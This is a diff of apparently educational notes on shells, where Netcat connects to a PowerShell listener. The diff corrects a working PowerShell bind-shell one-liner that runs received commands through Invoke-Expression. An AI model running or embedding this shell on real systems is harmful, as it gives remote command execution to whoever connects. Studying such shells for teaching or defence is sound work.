@@ -275,7 +275,7 @@ _note: iex = Invoke-Expression cmdlet is a key part of this code chunk as it run
 _The process is reversed when dealing with bind shells. We first create the bind shell through PowerShell on Bob's Computer, and then use Netcat to connect to it from Alice's_
 
 ```powershell
- powershell -c "$listener = New-Object System.Net.Sockets.TCPListener('0.0.0.0',<port>);$listener.start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes = 0..65532|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Lenght);$stream.Flush()};$client.Close();$listener.Stop()"
+ powershell -c "$listener = New-Object System.Net.Sockets.TCPListener('0.0.0.0',<port>);$listener.start();$client=$listener.AcceptTcpClient();$stream=$client.GetStream();[byte[]]$bytes = 0..65532|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
 ```
  
  _We include the `-v` option for Netcat as our bind shell may not always present us with a command prompt when it first connects_
